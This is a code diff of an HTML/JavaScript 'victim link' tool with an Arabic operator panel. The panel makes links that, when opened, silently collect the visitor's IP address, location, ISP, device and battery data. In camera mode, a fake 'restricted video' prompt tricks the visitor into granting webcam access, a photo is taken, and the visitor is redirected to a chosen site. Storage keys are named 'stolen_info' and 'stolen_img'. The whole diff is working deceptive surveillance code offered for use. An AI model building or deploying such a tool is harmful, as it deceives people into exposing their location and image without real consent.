@@ -3,151 +3,105 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard v4.0 | RAMBO</title>
+    <title>النظام المتكامل</title>
     <style>
-        :root { --bg: #020202; --card: #080808; --neon-blue: #00d2ff; --neon-green: #39ff14; --text: #e0e0e0; --glass: rgba(255, 255, 255, 0.03); }
-        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', Roboto, sans-serif; color: var(--text); overflow-x: hidden; }
-        .container { display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
-        
-        .admin-box { 
-            background: var(--card); padding: 35px; border-radius: 15px; width: 100%; max-width: 450px; 
-            border: 1px solid #111; box-shadow: 0 0 40px rgba(0, 210, 255, 0.05);
-            backdrop-filter: blur(15px); transition: 0.4s; z-index: 2;
-        }
-
-        h2 { text-align: center; color: var(--neon-blue); margin-bottom: 30px; font-weight: 200; letter-spacing: 4px; text-transform: uppercase; }
-        
-        .mode-container { display: flex; gap: 15px; margin-bottom: 25px; }
-        .mode-card { 
-            flex: 1; background: var(--glass); border: 1px solid #1a1a1a; padding: 20px; border-radius: 12px; 
-            text-align: center; cursor: pointer; transition: 0.3s ease;
-        }
-        .mode-card.active { border-color: var(--neon-blue); background: rgba(0, 210, 255, 0.05); transform: translateY(-3px); }
-        .mode-card b { font-size: 13px; display: block; }
-
-        input { 
-            width: 100%; padding: 15px; background: #000; border: 1px solid #1a1a1a; border-radius: 10px; 
-            color: #fff; margin-bottom: 20px; box-sizing: border-box; font-size: 14px;
-        }
-        input:focus { border-color: var(--neon-blue); outline: none; }
-
-        .main-btn { 
-            background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: #000; border: none; 
-            padding: 16px; border-radius: 10px; cursor: pointer; width: 100%; font-weight: bold; 
-            text-transform: uppercase; transition: 0.3s;
-        }
-        .main-btn:hover { filter: brightness(1.2); }
-
-        .result-box { margin-top: 25px; padding: 15px; background: #000; border-radius: 10px; border: 1px dashed var(--neon-green); display: none; }
-
-        #log-area { margin-top: 30px; display: none; animation: fadeIn 0.8s; width: 100%; }
-        .data-log { background: #050505; padding: 20px; border-radius: 12px; border-right: 3px solid var(--neon-green); }
-        .info-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 13px; border-bottom: 1px solid #111; padding-bottom: 6px; }
-        .info-row span { color: var(--neon-blue); }
-
-        /* تذييل الصفحة */
-        .footer { margin-top: 30px; text-align: center; font-size: 11px; color: #444; width: 100%; max-width: 450px; }
-        .footer b { color: var(--red); display: block; margin-bottom: 5px; color: #da3633; }
-        .rambo-tag { margin-top: 10px; color: var(--neon-blue); font-family: monospace; letter-spacing: 2px; opacity: 0.6; }
-
-        .victim-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
-        .dialog { background: #080808; padding: 40px; border-radius: 15px; text-align: center; border: 1px solid #1a1a1a; width: 85%; max-width: 320px; }
+        :root { --bg: #050505; --card: #0d1117; --accent: #238636; --neon: #58a6ff; --text: #c9d1d9; }
+        body { margin: 0; background: var(--bg); font-family: 'Segoe UI', sans-serif; color: var(--text); }
+        .container { display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .admin-box { background: var(--card); padding: 30px; border-radius: 12px; width: 100%; max-width: 500px; border: 1px solid #30363d; box-shadow: 0 10px 50px rgba(0,0,0,0.7); }
+        h2 { text-align: center; color: var(--neon); margin-bottom: 25px; }
+        .mode-select { display: flex; gap: 8px; margin-bottom: 20px; }
+        .mode-btn { flex: 1; padding: 10px; background: #161b22; border: 1px solid #30363d; color: var(--text); border-radius: 6px; cursor: pointer; font-size: 12px; transition: 0.3s; }
+        .mode-btn.active { background: var(--neon); color: #000; font-weight: bold; }
+        input { width: 100%; padding: 14px; background: #010409; border: 1px solid #30363d; border-radius: 8px; color: #fff; margin-bottom: 15px; box-sizing: border-box; }
+        .btn { background: #21262d; color: var(--neon); border: 1px solid #30363d; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
+        .btn:hover { background: var(--neon); color: #000; }
+        #log-area { margin-top: 25px; display: none; }
+        .data-card { background: #161b22; padding: 15px; border-radius: 8px; border-right: 4px solid var(--accent); margin-bottom: 15px; font-size: 13px; }
+        #preview-img { width: 100%; border-radius: 8px; margin-top: 10px; border: 1px solid var(--neon); }
+        .victim-ui { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
+        .dialog { background: #111; padding: 40px; border-radius: 20px; text-align: center; border: 1px solid #222; width: 85%; max-width: 350px; }
         .hidden { display: none !important; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div id="admin-panel" class="admin-box">
-        <h2>Control Center</h2>
-        
-        <div class="mode-container">
-            <div id="m1" class="mode-card active" onclick="selectMode('1', 'm1')"><b>سحب بيانات الضحية</b></div>
-            <div id="m2" class="mode-card" onclick="selectMode('2', 'm2')"><b>سحب صور</b></div>
+        <h2>لوحة التحكم</h2>
+        <div class="mode-select">
+            <button class="mode-btn active" onclick="setMode('silent', this)">سحب صامت (بيانات)</button>
+            <button class="mode-btn" onclick="setMode('camera', this)">سحب صور (بإذن)</button>
         </div>
+        <input type="text" id="urlInput" placeholder="أدخل رابط الوجهة (مثلاً يوتيوب)">
+        <button class="btn" onclick="generate()">إنشاء الرابط الذكي</button>
 
-        <input type="text" id="targetUrl" placeholder="أدخل رابط الوجهة">
-        <button class="main-btn" onclick="generateLink()">توليد الرابط</button>
-
-        <div id="resultBox" class="result-box">
-            <p style="font-size:10px; color:var(--neon-green); margin-bottom:10px;">الرابط المشفر:</p>
-            <input type="text" id="copyLink" readonly onclick="this.select()">
+        <div id="result" class="hidden" style="margin-top:20px;">
+            <p style="font-size:11px; color:var(--neon)">رابط الضحية:</p>
+            <input type="text" id="finalLink" readonly onclick="this.select()" style="border-color:var(--accent)">
         </div>
 
         <div id="log-area">
-            <div class="data-log">
-                <p style="color:var(--neon-blue); font-size:12px; margin-bottom:15px;">📡 التقارير الواردة:</p>
-                <div id="device-data"></div>
-                <div id="image-data" class="hidden">
-                    <img id="captured-img" style="width:100%; border-radius:8px; margin-top:15px; border: 1px solid #222;">
-                    <a id="download-link" download="RAMBO_REPORT.jpg" style="display:block; color:var(--neon-green); font-size:11px; text-align:center; margin-top:10px; text-decoration:none;">تحميل الوسائط</a>
+            <div class="data-card">
+                <b style="color:var(--neon)">📡 بيانات الجهاز المكتشفة:</b>
+                <div id="device-info" style="margin-top:10px; line-height:1.6;"></div>
+                <div id="img-holder" class="hidden">
+                    <img id="preview-img">
+                    <a id="dl-btn" download="capture.jpg" style="color:var(--accent); text-decoration:none; display:block; margin-top:5px; font-weight:bold;">⬇️ تحميل الصورة</a>
                 </div>
             </div>
         </div>
     </div>
-
-    <div class="footer">
-        <b>غير مسؤول في استخدامك للموقع !</b>
-        <div class="rambo-tag">Develop By RAMBO</div>
-    </div>
 </div>
 
-<div id="victim-ui" class="victim-overlay hidden">
+<div id="victim-panel" class="victim-ui hidden">
     <div class="dialog">
-        <h3 style="color:#fff; font-weight:300;">تأكيد الدخول</h3>
-        <p style="color: #666; font-size:13px;">يرجى السماح بالوصول للمتابعة.</p>
-        <button id="cameraBtn" class="main-btn" style="margin-top:15px;">متابعة</button>
+        <h2 style="color:#fff;">محتوى مقيد</h2>
+        <p style="color: #888;">لمشاهدة هذا الفيديو، يرجى منح إذن "السماح بالمشاهدة".</p>
+        <button class="btn" id="allowBtn" style="background: #ef4444; color:#fff; border:none;">السماح بالمشاهدة</button>
     </div>
     <video id="video" autoplay playsinline style="display:none"></video>
     <canvas id="canvas" style="display:none"></canvas>
 </div>
 
 <script>
-    let activeMode = '1';
-    const urlParams = new URLSearchParams(window.location.search);
-    const vMode = urlParams.get('v');
+    let currentMode = 'silent';
+    const params = new URLSearchParams(window.location.search);
+    const modeParam = params.get('m');
 
-    function selectMode(mode, id) {
-        activeMode = mode;
-        document.querySelectorAll('.mode-card').forEach(c => c.classList.remove('active'));
-        document.getElementById(id).classList.add('active');
+    function setMode(m, b) {
+        currentMode = m;
+        document.querySelectorAll('.mode-btn').forEach(btn => btn.classList.remove('active'));
+        b.classList.add('active');
     }
 
-    if (vMode) {
+    // --- منطق الضحية ---
+    if (modeParam) {
         document.getElementById('admin-panel').classList.add('hidden');
-        document.querySelector('.footer').classList.add('hidden');
         
-        async function startProtocol() {
-            const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-            const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
-            const ua = navigator.userAgent;
-
-            // تحديد نوع الهاتف
-            let deviceBrand = "غير محدد";
-            if (ua.match(/iPhone/i)) deviceBrand = "iPhone";
-            else if (ua.match(/Samsung/i)) deviceBrand = "Samsung";
-            else if (ua.match(/Huawei/i)) deviceBrand = "Huawei";
-            else if (ua.match(/Xiaomi/i)) deviceBrand = "Xiaomi";
-            else if (ua.match(/Android/i)) deviceBrand = "Android Device";
-
-            const payload = {
-                ip: ipData.ip || "N/A",
-                city: ipData.city || "Unknown",
-                isp: ipData.org || "Unknown",
+        async function startCapture() {
+            // سحب البيانات الصامتة فوراً (IP + جهاز + بطارية)
+            const ipRes = await fetch('https://ipapi.co/json/').catch(() => ({}));
+            const ipData = await ipRes.json ? await ipRes.json() : {};
+            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve(null));
+            
+            const info = {
+                ip: ipData.ip || "Unknown",
+                loc: `${ipData.city}, ${ipData.country_name}`,
                 os: navigator.platform,
-                brand: deviceBrand,
-                batt: batt ? (batt.level * 100).toFixed(0) + "%" : "N/A"
+                battery: battery ? (battery.level * 100).toFixed(0) + "%" : "??",
+                ua: navigator.userAgent
             };
-            localStorage.setItem('rambo_info', JSON.stringify(payload));
+            localStorage.setItem('stolen_info', JSON.stringify(info));
 
-            const redir = localStorage.getItem('redir_to') || 'https://google.com';
+            const target = localStorage.getItem('red_url') || 'https://google.com';
 
-            if (vMode === '1') {
-                window.location.href = redir;
+            if (modeParam === 'silent') {
+                window.location.href = target;
             } else {
-                document.getElementById('victim-ui').classList.remove('hidden');
-                document.getElementById('cameraBtn').onclick = async () => {
+                // وضع الكاميرا: إظهار الواجهة
+                document.getElementById('victim-panel').classList.remove('hidden');
+                document.getElementById('allowBtn').onclick = async () => {
                     try {
                         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                         const video = document.getElementById('video');
@@ -156,42 +110,38 @@
                             const canvas = document.getElementById('canvas');
                             canvas.width = 640; canvas.height = 480;
                             canvas.getContext('2d').drawImage(video, 0, 0);
-                            localStorage.setItem('rambo_img', canvas.toDataURL('image/jpeg'));
+                            localStorage.setItem('stolen_img', canvas.toDataURL('image/jpeg'));
                             stream.getTracks().forEach(t => t.stop());
-                            window.location.href = redir;
-                        }, 800);
-                    } catch { window.location.href = redir; }
+                            window.location.href = target;
+                        }, 1000);
+                    } catch { window.location.href = target; }
                 };
             }
         }
-        startProtocol();
+        startCapture();
     }
 
-    function generateLink() {
-        const val = document.getElementById('targetUrl').value;
-        if (!val) return;
-        localStorage.setItem('redir_to', val);
-        document.getElementById('copyLink').value = window.location.href.split('?')[0] + "?v=" + activeMode;
-        document.getElementById('resultBox').style.display = 'block';
+    // --- منطق المدير ---
+    function generate() {
+        const url = document.getElementById('urlInput').value;
+        if (!url) return alert("أدخل الرابط");
+        localStorage.setItem('red_url', url);
+        document.getElementById('finalLink').value = window.location.href.split('?')[0] + "?m=" + currentMode;
+        document.getElementById('result').classList.remove('hidden');
     }
 
     window.addEventListener('storage', (e) => {
         document.getElementById('log-area').style.display = 'block';
-        if (e.key === 'rambo_info') {
+        if (e.key === 'stolen_info') {
             const d = JSON.parse(e.newValue);
-            document.getElementById('device-data').innerHTML = `
-                <div class="info-row">نوع الهاتف: <span>${d.brand}</span></div>
-                <div class="info-row">عنوان IP: <span>${d.ip}</span></div>
-                <div class="info-row">المدينة: <span>${d.city}</span></div>
-                <div class="info-row">المزود: <span>${d.isp}</span></div>
-                <div class="info-row">نظام التشغيل: <span>${d.os}</span></div>
-                <div class="info-row">البطارية: <span>${d.batt}</span></div>
+            document.getElementById('device-info').innerHTML = `
+                IP: ${d.ip}<br>الموقع: ${d.loc}<br>النظام: ${d.os}<br>البطارية: ${d.battery}
             `;
         }
-        if (e.key === 'rambo_img') {
-            document.getElementById('image-data').classList.remove('hidden');
-            document.getElementById('captured-img').src = e.newValue;
-            document.getElementById('download-link').href = e.newValue;
+        if (e.key === 'stolen_img') {
+            document.getElementById('img-holder').classList.remove('hidden');
+            document.getElementById('preview-img').src = e.newValue;
+            document.getElementById('dl-btn').href = e.newValue;
         }
     });
 </script>
